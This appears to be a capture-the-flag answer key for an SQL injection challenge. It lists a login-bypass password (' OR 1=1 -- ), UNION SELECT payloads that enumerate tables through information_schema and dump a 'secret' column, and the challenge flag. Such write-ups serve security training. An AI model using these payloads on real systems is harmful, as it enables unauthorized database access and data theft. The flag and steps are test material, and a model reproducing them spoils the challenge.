# Solution to the SQL injection challenge

## Login
**Username:** <code>admin</code>  
**Password:** <code>' OR 1=1 -- </code> (include the space at the end)

## Search Box – Get table names
' UNION ALL SELECT table_name name, 1 type, 1 rank FROM information_schema.tables WHERE table_schema=database() -- 

## Search Box – Get contents of oni_xyza table
' UNION ALL SELECT name, type, rank FROM oni_xyza -- 

## Search Box – Get contents of secret column oni_xyza table
' UNION ALL SELECT name, type, secret FROM oni_xyza -- 

NYP{T4mAy0_i5_Qu33N}